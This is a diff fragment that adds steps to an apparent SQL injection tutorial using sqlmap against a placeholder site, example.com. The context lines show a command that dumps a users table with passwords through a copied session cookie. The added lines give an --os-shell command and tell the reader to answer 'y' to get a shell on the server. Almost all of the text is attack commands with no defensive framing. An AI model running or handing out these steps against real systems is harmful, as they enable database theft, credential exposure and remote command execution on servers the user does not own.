@@ -37,3 +37,8 @@ sqlmap -u "http://example.com/viewprofile.aspx?id=1" -cookie=<"cookie value whic
 sqlmap -u "http://example.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you copied"> -D movies -T users --dump 
 
 Now: You have obtained a list of users with their passowrds. 
+
+sqlmap -u "http://example.com/viewprofile.aspx?id=1" -cookie=<"cookie value which you copied"> --os-shell
+
+when prompts with options, press "y" and there you go, got a shell on the box. 
+
